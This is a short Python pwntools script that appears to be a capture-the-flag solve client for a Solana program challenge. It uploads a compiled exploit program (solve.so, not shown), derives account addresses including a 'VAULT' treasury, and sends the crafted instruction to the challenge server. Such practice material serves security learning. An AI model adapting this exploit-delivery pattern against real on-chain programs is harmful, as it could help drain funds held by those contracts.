from pathlib import Path

from pwn import remote
from solders.pubkey import Pubkey
from solders.system_program import ID

HOST = "challs.scriptsorcerers.xyz"
PORT = 10225
SOLVE_PUBKEY = b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx"

solve = Path(__file__).with_name("solve.so").read_bytes()

r = remote(HOST, PORT)

r.recvuntil(b"program pubkey: ")
r.sendline(SOLVE_PUBKEY)

r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"program: ")
program = Pubkey.from_string(r.recvline().strip().decode())

r.recvuntil(b"user: ")
user = Pubkey.from_string(r.recvline().strip().decode())

user_config, _ = Pubkey.find_program_address(
    [bytes(user), b"USER"], program
)

config, _ = Pubkey.find_program_address(
    [b"CONFIG"], program
)

treasury, _ = Pubkey.find_program_address(
    [b"VAULT"], program
)

item0, _ = Pubkey.find_program_address(
    [b"RUBBERDUCK"], program
)

r.sendline(b"7")
r.sendline(b"x " + str(program).encode())
r.sendline(b"ws " + str(user).encode())
r.sendline(b"x " + str(user_config).encode())
r.sendline(b"x " + str(config).encode())
r.sendline(b"x " + str(treasury).encode())
r.sendline(b"x " + str(item0).encode())
r.sendline(b"x " + str(ID).encode())

r.sendline(b"0")

r.interactive()
